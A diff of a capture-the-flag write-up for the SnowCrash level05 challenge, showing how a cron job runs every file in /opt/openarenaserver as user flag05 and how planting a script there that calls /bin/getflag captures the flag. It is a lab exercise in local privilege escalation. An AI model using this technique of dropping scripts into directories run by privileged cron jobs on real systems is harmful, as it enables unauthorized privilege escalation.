@@ -1,29 +1,30 @@
-find / -user flag05 2> /dev/null 
+# LEVEL05
 
-cat /usr/sbin/openarenaserver
+    level05@SnowCrash:~$ find / -user flag05 2> /dev/null 
+    /usr/sbin/openarenaserver
+    /rofs/usr/sbin/openarenaserver
+    level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+    #!/bin/sh
+    
+    for i in /opt/openarenaserver/* ; do
+            (ulimit -t 5; bash -x "$i")
+            rm -f "$i"
+    done
 
-output :
-#!/bin/sh
+Looks like a bash script that executes all files located in opt/openarenaserver/ and deletes them.
 
-for i in /opt/openarenaserver/* ; do
-        (ulimit -t 5; bash -x "$i")
-        rm -f "$i"
-done
+    level05@SnowCrash:~$ find / -name level05 2> /dev/null 
+    /var/mail/level05
+    /rofs/var/mail/level05
 
-breakdown :
-Bash script that executes all files located in /opt/openarenaserver/
 
-find / -name level05 2> /dev/null 
-output :
-/var/mail/level05
-/rofs/var/mail/level05
+    level05@SnowCrash:~$ cat /var/mail/level05
+    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+A cron tab job that switches to user flag05 every 2 minutes.
 
-cat /var/mail/level05
-output :
-*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+> Execute the getflag in the opt/openarenaserver/ and save its output.
 
-crontab qui execute la command avec la permission de flag05 toutes les deux minutes
+    nano /opt/openarenaserver/test.sh
+    /bin/getflag > /tmp/result
 
-Great! That means we can just paste the getflag executable in the /opt/openarenaserver
-Not really cus its gonna get deleted after its executed ....
-echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
+Wait 2 min.
